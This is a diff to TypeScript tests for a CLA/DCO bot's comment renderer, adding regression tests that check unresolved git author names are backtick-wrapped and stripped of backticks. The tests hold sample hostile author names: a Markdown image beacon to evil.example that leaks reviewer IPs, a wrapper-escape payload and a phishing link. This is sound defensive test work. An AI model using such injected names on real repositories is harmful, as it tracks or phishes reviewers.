@@ -64,7 +64,8 @@ describe('commentContent — CLA branch', () => {
       // graphql.ts assigns id `''` when no GitHub user could be matched to the
       // commit author — the name then comes from the raw git author name and
       // @-prefixing it can ping an unrelated GitHub login that happens to
-      // match. The fix: render the name without `@` in that case.
+      // match. The fix: render the name without `@` in that case, AND wrap
+      // it in backticks to neutralize Markdown (SEC-ESCAPE-AUTHOR-NAME).
       const map = makeMap({
         signed: [{ name: 'alice', id: 1 }],
         notSigned: [{ name: 'random-name', id: 0 as any }] // id absent
@@ -72,8 +73,80 @@ describe('commentContent — CLA branch', () => {
 
       const out = commentContent(false, map)
 
-      expect(out).toContain(':x: random-name')
+      expect(out).toContain(':x: `random-name`')
       expect(out).not.toContain('@random-name')
+    })
+  })
+
+  describe('SEC-ESCAPE-AUTHOR-NAME: unresolved git author names are neutralized', () => {
+    it('neutralizes a Markdown image embed in an unresolved committer name', () => {
+      // Attack: PR opener commits with author name `![pixel](https://evil/log)`.
+      // Without escaping, GitHub renders the image and exfiltrates reviewer IPs.
+      const malicious = '![pixel](https://evil.example/log?pr=1)'
+      const map = makeMap({
+        notSigned: [
+          { name: 'alice', id: 1 }, // pad to trigger committer-list rendering
+          { name: malicious, id: 0 as any }
+        ]
+      })
+
+      const out = commentContent(false, map)
+
+      // The raw image markdown must not appear unwrapped — backticks must
+      // bracket it so it renders as inline code.
+      expect(out).toContain(`:x: \`${malicious}\``)
+      expect(out).not.toMatch(/:x: !\[pixel\]/)
+    })
+
+    it('strips embedded backticks from the unresolved name to prevent wrapper escape', () => {
+      // Naive `'\`' + name + '\`'` wrap is escapable if the name itself
+      // contains backticks. Strip them.
+      const map = makeMap({
+        notSigned: [
+          { name: 'alice', id: 1 },
+          { name: 'evil`![pwn](https://evil)`', id: 0 as any }
+        ]
+      })
+
+      const out = commentContent(false, map)
+
+      // Embedded backticks must be stripped so the wrapper can't be escaped.
+      // Wrapped form: `evil![pwn](https://evil)`. The inner backticks from
+      // the malicious input are gone — only the two outer wrapping backticks
+      // remain. Verify by counting backticks around the malicious sequence.
+      expect(out).toContain(':x: `evil![pwn](https://evil)`')
+      // Negative: the un-stripped form (`evil\`![pwn]...\`\`) would leave
+      // a backtick run that can prematurely close the wrap.
+      expect(out).not.toContain('evil`!')
+    })
+
+    it('neutralizes Markdown in the "unknown" committer bucket', () => {
+      const map = makeMap({
+        unknown: [{ name: '[click here](https://phish.example)', id: 0 as any }]
+      })
+
+      const out = commentContent(false, map)
+
+      expect(out).toContain('`[click here](https://phish.example)`')
+      // raw clickable link must not appear unwrapped
+      expect(out).not.toMatch(/\*\*\[click here\]/)
+    })
+
+    it('leaves resolved-GitHub-user names unescaped (login is alphanumeric+hyphen)', () => {
+      // Belt-and-suspenders: when the committer has a real id, the name we
+      // use is `login` which GitHub guarantees is safe. Don't backtick-wrap
+      // it — the @-mention would otherwise render as inline-code literal.
+      const map = makeMap({
+        notSigned: [
+          { name: 'alice', id: 1 },
+          { name: 'real-login', id: 42 }
+        ]
+      })
+
+      const out = commentContent(false, map)
+
+      expect(out).toContain(':x: @real-login')
+      expect(out).not.toContain('`real-login`')
     })
   })
 
@@ -136,7 +209,7 @@ describe('commentContent — DCO branch', () => {
       notSigned: [{ name: 'ghost', id: 0 as any }]
     })
     const out = commentContent(false, map)
-    expect(out).toContain(':x: ghost')
+    expect(out).toContain(':x: `ghost`')
     expect(out).not.toContain('@ghost')
   })
 
